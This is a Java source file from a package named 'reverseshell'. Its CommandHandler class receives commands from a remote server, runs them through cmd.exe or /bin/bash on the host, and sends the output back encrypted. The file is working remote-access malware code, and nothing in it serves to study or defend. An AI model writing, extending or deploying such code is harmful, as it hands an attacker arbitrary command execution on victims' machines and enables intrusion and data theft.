package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.plugins.CDCommand;
import obs1d1anc1ph3r.reverseshell.plugins.CommandPlugin;

public class CommandHandler {

	private static final Logger logger = Logger.getLogger(CommandHandler.class.getName());
	private final ServerConnection serverConnection;
	private final PluginManager pluginManager;

	public CommandHandler(ServerConnection serverConnection, PluginManager pluginManager) {
		this.serverConnection = serverConnection;
		this.pluginManager = pluginManager;
	}

	public void handleCommands() throws IOException, Exception {
		String command;
		while ((command = serverConnection.readCommand()) != null) {
			if (command.equalsIgnoreCase("exit")) {
				logger.info("Server disconnected.");
				break;
			}

			String[] commandParts = command.split(" ", 2);
			String commandName = commandParts[0].toLowerCase();
			CommandPlugin plugin = pluginManager.getPlugin(commandName);

			if (plugin != null) {
				String response = plugin.execute(commandParts.length > 1 ? new String[]{commandParts[1]} : new String[]{});
				if (response != null && !response.isEmpty()) {
					serverConnection.sendEncryptedResponse(response);
				}
			} else {
				String response = executeCommand(command);
				serverConnection.sendEncryptedResponse(response);
			}
		}
	}

	public String executeCommand(String command) {
		StringBuilder output = new StringBuilder();
		try {
			String os = System.getProperty("os.name").toLowerCase();
			String shell;
			String shellFlag;
			if (os.contains("win")) {
				shell = "cmd.exe";
				shellFlag = "/c";
			} else {
				shell = "/bin/bash";
				shellFlag = "-c";
			}

			ProcessBuilder processBuilder = new ProcessBuilder(shell, shellFlag, command);
			processBuilder.redirectErrorStream(true);
			processBuilder.directory(new File(CDCommand.getCurrentDirectory()));
			Process process = processBuilder.start();

			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
				String line;
				while ((line = reader.readLine()) != null) {
					output.append(line).append("\n");
				}
			}

			boolean finished = process.waitFor(10, TimeUnit.SECONDS);
			if (!finished) {
				process.destroy();
				return "Error: Command timed out.";
			}

			int exitCode = process.exitValue();
			if (exitCode != 0) {
				return "Error executing command, exit code: " + exitCode;
			}

		} catch (IOException | InterruptedException e) {
			return "Error executing command: " + e.getMessage();
		}
		return output.toString().trim();
	}
}
